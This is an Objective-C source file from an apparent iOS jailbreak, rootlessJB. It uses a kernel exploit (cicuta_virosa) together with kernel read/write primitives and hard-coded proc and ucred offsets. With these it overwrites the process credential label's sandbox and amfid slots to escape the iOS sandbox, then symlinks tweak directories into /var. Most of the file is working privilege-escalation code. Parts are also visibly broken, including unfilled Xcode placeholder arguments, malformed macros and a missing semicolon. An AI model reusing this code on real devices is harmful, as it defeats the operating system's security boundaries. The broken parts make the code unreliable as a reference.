//
//  rootless.m
//  rootlessJB
//
//  Created by Brandon Plank on 2/14/21.
//

#include "comet.h"
#include "cicuta_virosa.h"
#include <spawn.h>





#define in_bundle(obj) strdup([[[[NSBundle mainBundle] bundlePath] stringByAppendingPathComponent:@obj] UTF8String])

#define failIf(condition, message, ...) if (condition) {\
                                            goto end;\
                                        }


#define copyFile(copyFrom, copyTo) [[NSFileManager defaultManager] copyItemAtPath:@(copyFrom) toPath:@(copyTo) error:&error]; \
                                 \
                                   }
                                    
                                   


static unsigned off_p_pid = 0x68;               // proc_t::p_pid
static unsigned off_task = 0x10;                // proc_t::task
static unsigned off_p_uid = 0x30;               // proc_t::p_uid
static unsigned off_p_gid = 0x34;               // proc_t::p_uid
static unsigned off_p_ruid = 0x38;              // proc_t::p_uid
static unsigned off_p_rgid = 0x3c;              // proc_t::p_uid
static unsigned off_p_ucred = 0xf0;            // proc_t::p_ucred
static unsigned off_p_csflags = 0x280;          // proc_t::p_csflags

static unsigned off_ucred_cr_uid = 0x18;        // ucred::cr_uid
static unsigned off_ucred_cr_ruid = 0x1c;       // ucred::cr_ruid
static unsigned off_ucred_cr_svuid = 0x20;      // ucred::cr_svuid
static unsigned off_ucred_cr_ngroups = 0x24;    // ucred::cr_ngroups
static unsigned off_ucred_cr_groups = 0x28;     // ucred::cr_groups
static unsigned off_ucred_cr_rgid = 0x68;       // ucred::cr_rgid
static unsigned off_ucred_cr_svgid = 0x6c;      // ucred::cr_svgid
static unsigned off_ucred_cr_label = 0x78;      // ucred::cr_label

static unsigned off_sandbox_slot = 0x10;
static unsigned off_t_flags = 0x3a0; // task::t_flags


    
    
int launch(char *binary, char *arg1, char *arg2, char *arg3, char *arg4, char *arg5, char *arg6, char**env) {
    pid_t pd;
    const char* args[] = {binary, arg1, arg2, arg3, arg4, arg5, arg6,  NULL};
    
    int rv = posix_spawn(&pd, binary, NULL, NULL, (char **)&args, env);
    sleep(1);
    return rv;
}
 
    
int installBootstrapAndUnsadbox(void *init){

    uint64_t task_pac = cicuta_virosa();
    printf("task PAC: 0x%llx\n", task_pac);
    uint64_t task = task_pac | 0xffffff8000000000;
   
    printf("PAC decrypt: 0x%llx -> 0x%llx\n", task_pac, task);

    uint64_t proc_pac = read_64(task + 0x3A0);

    printf("proc PAC: 0x%llx\n", proc_pac);
    uint64_t proc = proc_pac | 0xffffff8000000000;
    printf("PAC decrypt: 0x%llx -> 0x%llx\n", proc_pac, proc);
    uint64_t ucred_pac = read_64(proc + 0xf0);
    printf("ucred PAC: 0x%llx\n", ucred_pac);
    uint64_t ucred = ucred_pac | 0xffffff8000000000;
    printf("PAC decrypt: 0x%llx -> 0x%llx\n", ucred_pac, ucred);
       uint32_t buffer[5] = {0, 0, 0, 1, 0};
       
      

       uint32_t uid = getuid();
       printf("getuid() returns %u\n", uid);
       printf("whoami: %s\n", uid == 0 ? "root" : "mobile");
       printf("escaping the prison of apple\n");
       uint64_t cr_label_pac = read_64(ucred + 0x78);
       uint64_t cr_label = cr_label_pac | 0xffffff8000000000;
       printf("PAC decrypt: 0x%llx -> 0x%llx\n", cr_label_pac, cr_label);
       write_20(cr_label + 0x10, (void*)buffer);
    printf("\npatching amfid_slot...");
    printf("\namfid_slot - > %llu",read_64(cr_label + 0x8));
    write_64(cr_label + 0x8, (void*)buffer);
    printf("\namfid_slot - > %llu",read_64(cr_label + 0x8));
   
    [[NSFileManager defaultManager] createFileAtPath:@"/var/mobile/c0met.ini" contents:nil attributes:nil];
    if([[NSFileManager defaultManager] fileExistsAtPath:@"/var/mobile/c0met.ini"]){
        printf("prison break :)\n");
      launch("/var/mobile/uicache", <#char *arg1#>, <#char *arg2#>, <#char *arg3#>, <#char *arg4#>, <#char *arg5#>, <#char *arg6#>, <#char **env#>)
       
           
           uint64_t entitlements = read_64(read_64(ucred+0x78)+0x8);
           
          
        NSLog(@"Symlinking stuff...");
            NSString *LIB = @"/var/containers/Bundle/tweaksupport/Library";
            NSString *ulib = @"/var/containers/Bundle/tweaksupport/usr/lib";
            NSString *bin = @"/var/containers/Bundle/tweaksupport/bin";
            NSString *sbin = @"/var/containers/Bundle/tweaksupport/sbin";
            
            symlink((char*)[LIB UTF8String], "/var/LIB");
            symlink((char*)[ulib UTF8String], "/var/ulb");
            symlink((char*)[bin UTF8String], "/var/bin");
            symlink((char*)[sbin UTF8String], "/var/sbin");
        
    } else {
        printf("Could not escape the sandbox\n");
    }
   
    sleep(1);

    return 0;
}

